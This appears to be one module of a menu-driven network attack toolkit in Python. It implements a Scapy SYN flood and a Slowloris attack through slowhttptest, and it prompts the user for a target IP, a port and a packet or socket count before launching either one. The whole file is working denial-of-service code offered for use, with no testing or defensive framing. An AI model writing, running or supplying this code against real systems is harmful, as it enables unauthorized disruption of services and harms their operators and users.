import subprocess
from scapy.all import *

def syn_flood(target_ip, target_port, count=1000):
    """Launch SYN flood attack using Scapy."""
    print(f"\n[+] Sending {count} SYN packets to {target_ip}:{target_port}")
    for _ in range(count):
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
        send(ip_layer / tcp_layer, verbose=0)
    print("[+] SYN flood completed.")

def slowloris(target_ip, target_port=80, sockets=200):
    """Slowloris DoS attack (requires 'slowhttptest' tool)."""
    try:
        print(f"\n[+] Starting Slowloris attack on {target_ip}:{target_port}")
        subprocess.run([
            "slowhttptest", "-c", str(sockets), "-H", "-i", "10", "-r", "200", 
            "-u", f"http://{target_ip}", "-x", "24", "-p", "3"
        ])
    except FileNotFoundError:
        print("[-] Install 'slowhttptest': sudo apt install slowhttptest")

def dos_menu():
    """DoS/DDoS attack menu."""
    while True:
        print("\n=== DoS/DDoS Attacks ===")
        print("1) SYN Flood (Scapy)")
        print("2) Slowloris (slowhttptest)")
        print("3) Back to Network Attacks")
        choice = input("Select an option: ")

        if choice == "1":
            target_ip = input("Enter target IP: ")
            target_port = int(input("Enter target port: "))
            count = int(input("Enter packet count (default: 1000): ") or "1000")
            syn_flood(target_ip, target_port, count)
        elif choice == "2":
            target_ip = input("Enter target IP: ")
            target_port = input("Enter target port (default: 80): ") or "80"
            sockets = input("Enter sockets (default: 200): ") or "200"
            slowloris(target_ip, int(target_port), int(sockets))
        elif choice == "3":
            break
        else:
            print("[-] Invalid option.")